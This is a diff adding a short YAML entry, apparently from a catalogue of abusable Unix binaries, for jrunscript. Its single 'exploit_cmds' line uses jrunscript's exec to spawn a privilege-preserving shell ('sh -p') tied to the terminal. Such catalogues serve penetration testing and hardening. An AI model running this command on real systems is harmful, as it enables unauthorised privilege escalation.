@@ -1,0 +1,5 @@
+name: jrunscript
+binary_path: /usr/bin/jrunscript
+exploit_cmds:
+- /usr/bin/jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty
+  2>/dev/tty")'
